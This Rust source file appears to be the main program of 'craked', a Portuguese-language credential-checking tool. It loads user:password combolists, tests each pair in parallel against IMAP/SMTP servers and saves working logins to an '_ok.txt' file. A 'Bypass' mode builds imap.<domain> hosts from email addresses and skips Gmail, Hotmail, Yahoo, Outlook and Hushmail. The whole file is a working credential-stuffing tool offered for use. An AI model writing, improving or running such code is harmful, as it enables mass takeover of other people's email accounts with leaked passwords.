use colored::Colorize;
use craked::args::argumentos;
use craked::check::{TypesProtocol, ViewimapSmtp};
use craked::connect;
use craked::connect::{connect, Connect};
use craked::format::formatLine;
use craked::{Animation, ArtProgram, Writecolor};
use imap::Error::No;
use imap::{connect_starttls, Error};
use rayon::iter::IntoParallelIterator;
use rayon::iter::ParallelIterator;
use std::fs;
use std::io::{read_to_string, stdin, stdout, Write};
use std::path::{Path, PathBuf};
use std::process::exit;
use std::process::Command;
use std::ptr::write;
fn main() {
    loop {
        cliclean();
        ArtProgram();
        for stoutclid in ViewimapSmtp(None).unwrap() {
            Writecolor(format!(
                "[OK] -> {:<1}\t[OK] -> {}",
                stoutclid.0, stoutclid.1.filename
            ));
        }

        let inputs = input("Digite a opção:");
        match inputs {
            Some(main) => {

                if main == 000 {
                    cliclean();
                    Writecolor("Bye :)");
                    exit(0);
                }
                // opções
                if let Err(search) = ViewimapSmtp(Some(main)) {
                    match search {
                        Some(ok) => {
                            cliclean();
                            asciiart(ok.filename.clone());
                            println!("");
                            let namefile = inputstring("Filename: ");
                            match listingfile(namefile) {
                                Some(cheking) => {
                                    let tamlins = cheking.len();
                                    Writecolor(format!("Lines carregadas: {}", tamlins));
                                    if tamlins == 0 {
                                        Writecolor("Arquivo vazio sem nenhum dandos para checkar ");
                                        sleeptime();
                                        continue;
                                    }

                                    startconnect(input("Poolthreads number:"), cheking, ok);
                                    cliclean();
                                    asciiart("TERMINADO ..");
                                    std::thread::sleep(std::time::Duration::from_secs(10));

                                }
                                _ => {
                                    Writecolor("File not found");
                                    sleeptime();
                                }
                            }
                        }
                        _ => {
                            Writecolor("Invalid number :( ");
                            sleeptime();
                        }
                    }
                } else {
                    Writecolor("Invalid number");
                    sleeptime();
                }
            }
            _ => {
                Writecolor(" Number Please");
                sleeptime();
            }
        }
    }
}

fn cliclean() {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/c", "cls"])
            .spawn()
            .expect("cls command failed to start")
            .wait()
            .expect("failed to wait");
    } else {
        Command::new("clear")
            .spawn()
            .expect("clear command failed to start")
            .wait()
            .expect("failed to wait");
    };
}
fn input<T: AsRef<str>>(name_space: T) -> Option<i32> {
    print!("{}{}", name_space.as_ref(), "->:".bright_white());
    let mut string = String::new();
    stdout().flush().unwrap();
    stdin().read_line(&mut string).unwrap();

    let format = string.trim().replace(" ", "").parse::<i32>();

    match format {
        Ok(number) => Some(number),
        Err(_) => None,
    }
}
fn inputstring<T: AsRef<str>>(name_space: T) -> String {
    print!("{}{}", name_space.as_ref(), "->:".bright_white());
    let mut string = String::new();
    stdout().flush().unwrap();
    stdin().read_line(&mut string).unwrap();
    string.trim().to_string()
}

fn sleeptime() {
    std::thread::sleep(std::time::Duration::from_secs(2));
}
use text2art::BasicFonts;
use text2art::Font;
use text2art::Printer;

fn asciiart<T: AsRef<str>>(text: T) {
    let font = match Font::from_basic(BasicFonts::Big) {
        Ok(font) => font,
        Err(_) => panic!("Error font ascii <telegram @fullshell < dev>"),
    };
    let prntr = Printer::with_font(font);
    let rendered_text = prntr.render_text(text.as_ref());
    match rendered_text {
        Ok(rendered_text) => {
            for line in rendered_text.lines() {
                Writecolor(line);
            }
        }
        Err(_) => println!("Something went wrong!"),
    }
}
use std::io::Read;
fn readfile<T: AsRef<str>>(path: T) -> Option<String> {
    let mut buffer = Vec::new();

    // Tentar ler o arquivo
    match fs::File::open(path.as_ref()) {
        Ok(mut file) => {
            if let Err(_) = file.read_to_end(&mut buffer) {
                return None;
            }
        }
        Err(_) => return None,
    }

    // Converta o buffer de bytes em uma String UTF-8, ignorando os bytes inválidos
    match String::from_utf8_lossy(&buffer) {
        cow @ std::borrow::Cow::Borrowed(_) => Some(cow.to_string()),
        cow @ std::borrow::Cow::Owned(_) => Some(cow.into_owned()),
    }
}

fn listingfile<T: AsRef<str>>(path: T) -> Option<Vec<String>> {

    let mut ok = Vec::new();
    match readfile(path.as_ref()) {
        Some(buffer_file) => {
            ok = formatLine(buffer_file.as_str());
        }
        _ => {
            return None;
        }
    }
    Some(ok)
}

fn startconnect(PollNumber: Option<i32>, ArrayLogins: Vec<String>, Connections: TypesProtocol) {
    let pollthreads = PollNumber.unwrap_or(35);
    let coon = Connections.clone();
    let filename = format!("{}_ok.txt", coon.filename);
    let host = coon.host;
    let port = coon.port;
    if host == "Bypass".to_string(){

        bypassm(pollthreads,ArrayLogins, Connections);
        return;
    }
    let _thread_pool = rayon::ThreadPoolBuilder::new() // Alterado para rayon::ThreadPoolBuilder
        .num_threads( pollthreads as usize)
        .build_global()
        .unwrap();

    ArrayLogins.into_par_iter().for_each(|x| {
        // threads cada inter tem threads
        let op_X: Vec<&str> = x.split(":").collect();
        if op_X.len() == 2 {
            let username = op_X[0];

            let password: &str = op_X[1];
            let connections: Connect = connect(
                host.clone(),
                username.to_string(),
                password.to_string(),
                port as u16,
            );
            match connections {
                Connect::ConnectionSucces(username, pass) => {

                    let sucess = format!("{}|{}|{}|{}", host.clone(), port, username, pass);
                    saveLogs(sucess.clone());
                    Writecolor(sucess.clone());
                    savesuccess(sucess, filename.clone());
                    sleeptime();
                }
                Connect::ErroConnection(value) => {
                    saveLogs(value);
                }
                Connect::ErroAuth(value) => {
                    saveLogs(value);

                    Writecolor("\n\nFailed ");
                }
                _ => {
                    cliclean();
                    asciiart(filename.clone());

                    // 0xe3 not
                }
            }
        }
    });
}
fn saveLogs(valor: String) {
    let mut logsfilename = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open("logs.txt")
        .unwrap();
    logsfilename.write(format!("{}\n", valor).as_bytes());
}
fn savesuccess(valor: String, filename: String) {
    let mut logsfilename = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open(filename)
        .unwrap();
    logsfilename.write(format!("{}\n", valor).as_bytes());
}

fn bypassm(threads: i32, ArrayLogins: Vec<String>, Connections: TypesProtocol){
    let _thread_pool = rayon::ThreadPoolBuilder::new() // Alterado para rayon::ThreadPoolBuilder
        .num_threads( threads as usize)
        .build_global()
        .unwrap();
    let coon = Connections;
    let filename = format!("{}_ok.txt", coon.filename);
    let port = coon.port;
    ArrayLogins.into_par_iter().for_each(|x| {
        let op_X: Vec<&str> = x.split(":").collect();
        if x.contains("@") && op_X.len() == 2{
            let username = op_X[0];
            let password = op_X[1];

            if let Some(hostbypass) = bypassformat(username){
               
                let connections: Connect = connect(
                    format!("imap.{}",hostbypass.clone()),
                    username.to_string(),
                    password.to_string(),
                    port as u16,
                );
                match connections {
                    Connect::ConnectionSucces(username, pass) => {

                        let sucess = format!("imap.{}|{}|{}|{}", hostbypass, port, username, pass);
                        saveLogs(sucess.clone());
                        Writecolor(sucess.clone());
                        savesuccess(sucess, filename.clone());
                        sleeptime();
                    }
                    Connect::ErroConnection(value) => {
                        saveLogs(value);
                    }
                    Connect::ErroAuth(value) => {
                        saveLogs(value);

                        Writecolor("\n\nFailed ");
                    }
                    _ => {
                        cliclean();
                        asciiart(filename.clone());

                        // 0xe3 not
                    }
                }

            }
        }
    });

}

fn bypassformat(line: &str) -> Option<String>{
    let not = vec!["hotmail","gmail","hushmail","yahoo","outlook"];
    let bypass: Vec<&str> = line.split("@").collect();
   if bypass.len() == 2 {
       let bypasshost = bypass[1];
        for notpermision in not{
            if bypasshost.contains(notpermision){
                return None;
            }
        }
        Some(bypass[1].to_string())
    }
    else { None }
}

